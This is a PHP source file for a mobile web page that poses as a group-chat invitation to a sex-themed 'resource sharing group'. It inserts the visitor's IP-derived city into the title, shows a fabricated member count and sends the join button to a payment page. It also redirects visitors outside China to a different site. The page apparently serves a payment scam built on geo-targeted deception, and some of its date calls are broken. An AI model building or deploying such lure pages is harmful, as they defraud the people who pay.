<?php
	error_reporting(0); 
	require_once("./inc/function.php");
	require_once("./inc/getINC.php");
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="format-detection" content="telephone=no">
<link href="css/style.css" rel="stylesheet" type="text/css" />
<link href="css/style2.css" rel="stylesheet" type="text/css" />
<title>群聊邀请</title>
<script src="js/jquery.js"></script>
</head>
<body>
	<div class="top">
		<img id="headimg" src="/img/mm.jpg" alt="" style="width: 17%;height: 63.75px;">
      
		<?php
			if(getCity(getIp())!='未知' ){
				if(date_default_timezone_get() != "Asia/Shanghai"){
					date_default_timezone_set("Asia/Shanghai");
				}
				echo '<h2 id="title">'.getCity(getIp()).'外围少妇资源共享群'.date('',strtotime()).'</h2>';
			}else{
				echo '<h2 id="title">外围少妇资源共享群'.date('',strtotime()).'</h2>';
			}

		?>
		<span id="people">(共368人)</span>
	</div>


	<div class="bot">
      	<span id="invite">小甜很甜 邀请你加入群聊</span>
		  <a href="/zhifu.php" tppabs="" class="weui_btn weui_btn_warn">加入该群聊</a><br>
		<?php 

			if(getCity(getIp())!='未知' ){   //获取到IP地址
				if(getCountry(getIp())=='中国' ){ 
					echo "";   //中国用户跳转页面
				}else{
					echo "<a class='bon' href='".OTHERSITE."'></a>";   //其他国家跳转页面
				}
			}else{   //没获取到IP地址
				echo "<a class='bon' href='app/index.html'></a>";   //若没获取到IP地址，则显示这段内容
			}

		?>

	</div>
	
	

</body>
</html>